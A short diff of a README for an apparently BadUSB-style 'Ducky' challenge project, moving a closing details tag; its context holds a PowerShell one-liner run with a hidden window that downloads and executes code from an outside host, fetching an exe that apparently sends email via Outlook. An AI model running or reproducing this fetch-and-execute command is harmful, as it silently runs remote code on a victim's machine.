@@ -295,6 +295,8 @@ set up is similar to the other build
 powershell -w h "IEX(iwr('https://vercelutilsserver.gymthun.com/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fwrite_mail.exe&arg=example%40example.com'))"
 ```
 
+</details>
+
 ## Acknowledgments
 Inspiration, code snippets, etc.
 
@@ -304,5 +306,3 @@ Inspiration, code snippets, etc.
 - [stackoverflow | change-audio-level-from-powershell](https://stackoverflow.com/a/31751275/20443541)
 - [community.spiceworks.com | sending-an-email-from-outlook-via-powershell](https://community.spiceworks.com/t/sending-an-email-from-outlook-via-powershell/938248)
 - [learn.microsoft | outlook.mailitem](https://learn.microsoft.com/en-us/office/vba/api/outlook.mailitem)
-
-</details>
